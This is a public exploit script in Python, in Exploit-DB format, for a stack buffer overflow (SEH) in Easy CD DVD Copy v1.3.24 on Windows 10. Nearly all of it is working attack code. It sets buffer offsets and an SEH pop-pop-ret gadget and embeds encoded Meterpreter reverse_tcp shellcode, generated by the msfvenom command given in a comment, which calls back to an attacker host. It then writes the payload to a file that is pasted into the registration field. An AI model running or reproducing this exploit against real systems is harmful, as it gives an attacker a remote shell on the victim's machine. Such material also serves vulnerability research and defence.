"""
Exploit title:      Easy CD DVD Copy v.1.3.24 - Stack Buffer Overflow (SEH)
Exploit Author:     Paolo Stagno aka VoidSec - voidsec@voidsec.com - https://voidsec.com
Date:               01/07/2020
Vendor Homepage:    http://www.divxtodvd.net/index.htm
Download:           https://www.exploit-db.com/apps/ea6dad29d025e66110243bd197c1870c-easy_cd_dvd_copy.exe
Version:            v.1.3.24
Tested on:          Windows 10 Pro x64 v.1909 Build 18363.418
Category:           local exploit
Platform:           windows
Usage:              Paste content of Easy_CD_DVD _Copy_v. 1.3.24_exploit.txt in the "Username" field in the Register dialog
"""
#!/usr/bin/python
import struct
filename="Easy_CD_DVD_Copy_v.1.3.24_exploit.txt"

# any buff length >= 200 will be fine, giving more room for the final exploit
# |                                                                 buf (2000)                                                   |
# | filler until nSEH is hit (980) | nSEH (4) | SEH (4) | stack adj (6) | shellcode (371) | filler until the end of buffer (635) |

buf_max_size = 2000
nseh_offset = 980
# BAD CHARS: \x00\x0a\x0d
# !mona compare -f "C:\\logs\\Easy_CD_DVD_Copy\\bytearray.bin" -a 
# !mona bytearray -cpb '\x00\x0a\x0d'
# msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=192.168.206.1 exitfunc=seh -b "\x00\x0a\x0d" -f python -v shellcode
# shellcode length 371 bytes
shellcode =  b""
shellcode += b"\xd9\xc4\xba\xb2\xf9\x23\x91\xd9\x74\x24\xf4"
shellcode += b"\x5f\x31\xc9\xb1\x57\x83\xc7\x04\x31\x57\x13"
shellcode += b"\x03\xe5\xea\xc1\x64\xf5\xe5\x84\x87\x05\xf6"
shellcode += b"\xe8\x0e\xe0\xc7\x28\x74\x61\x77\x99\xfe\x27"
shellcode += b"\x74\x52\x52\xd3\x0f\x16\x7b\xd4\xb8\x9d\x5d"
shellcode += b"\xdb\x39\x8d\x9e\x7a\xba\xcc\xf2\x5c\x83\x1e"
shellcode += b"\x07\x9d\xc4\x43\xea\xcf\x9d\x08\x59\xff\xaa"
shellcode += b"\x45\x62\x74\xe0\x48\xe2\x69\xb1\x6b\xc3\x3c"
shellcode += b"\xc9\x35\xc3\xbf\x1e\x4e\x4a\xa7\x43\x6b\x04"
shellcode += b"\x5c\xb7\x07\x97\xb4\x89\xe8\x34\xf9\x25\x1b"
shellcode += b"\x44\x3e\x81\xc4\x33\x36\xf1\x79\x44\x8d\x8b"
shellcode += b"\xa5\xc1\x15\x2b\x2d\x71\xf1\xcd\xe2\xe4\x72"
shellcode += b"\xc1\x4f\x62\xdc\xc6\x4e\xa7\x57\xf2\xdb\x46"
shellcode += b"\xb7\x72\x9f\x6c\x13\xde\x7b\x0c\x02\xba\x2a"
shellcode += b"\x31\x54\x65\x92\x97\x1f\x88\xc7\xa5\x42\xc5"
shellcode += b"\x24\x84\x7c\x15\x23\x9f\x0f\x27\xec\x0b\x87"
shellcode += b"\x0b\x65\x92\x50\x1d\x61\x25\x8e\xa5\xe2\xdb"
shellcode += b"\x2e\xd6\x2b\x18\x7a\x86\x43\x89\x02\x4d\x94"
shellcode += b"\x36\xd7\xf8\x9e\xa0\x17\x54\x50\x31\xff\xa7"
shellcode += b"\x6d\x23\xa3\x2e\x8b\x13\x0b\x61\x04\xd4\xfb"
shellcode += b"\xc1\xf4\xbc\x11\xce\x2b\xdc\x1a\x04\x44\x77"
shellcode += b"\xf4\xf1\x3c\xe0\x6d\x58\xb6\x91\x72\x76\xb2"
shellcode += b"\x92\xf8\x73\x42\x5c\x08\xf1\x50\x89\x6f\xf9"
shellcode += b"\xa8\x4a\x05\xf9\xc2\x4e\x8f\xae\x7a\x4d\xf6"
shellcode += b"\x99\x24\xae\xdd\x99\x23\x50\xa3\xab\x58\x67"
shellcode += b"\x31\x94\x36\x88\xd5\x14\xc7\xde\xbf\x14\xaf"
shellcode += b"\x86\x9b\x46\xca\xc8\x36\xfb\x47\x5d\xb8\xaa"
shellcode += b"\x34\xf6\xd0\x50\x62\x30\x7f\xaa\x41\x42\x87"
shellcode += b"\x54\x17\x6d\x2f\x3d\xe7\x2d\xcf\xbd\x8d\xad"
shellcode += b"\x9f\xd5\x5a\x81\x10\x16\xa2\x08\x79\x3e\x29"
shellcode += b"\xdd\xc8\xdf\x2e\xf4\x8c\x41\x2e\xfb\x14\x71"
shellcode += b"\x55\x74\xab\x72\xaa\x9c\xc8\x72\xaa\xa0\xef"
shellcode += b"\x4f\x7c\x99\x9a\x8e\xbc\x9e\x9a\x1f\x71\x0b"
shellcode += b"\x08\x20\x26\x34\x19\x4a\xc8\x09"

buf  = ""
buf += "A" * nseh_offset
buf += "BBBB"   # nSEH
buf += struct.pack("<I",0x10037859) # SEH 
# 0x10037859 : pop ebx # pop eax # ret  | ascii {PAGE_EXECUTE_READ} [SkinMagic.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v1.8.1.1 (C:\Program Files (x86)\Easy CD DVD Copy\SkinMagic.dll)
buf += "\x81\xc4\x24\xfa\xff\xff"   # stack adjustment for meterpreter GetPC routine; add esp, -1500
buf += shellcode   
buf += "D" * (buf_max_size - len(buf))

f = open(filename, 'w')
f.write(buf)
f.close()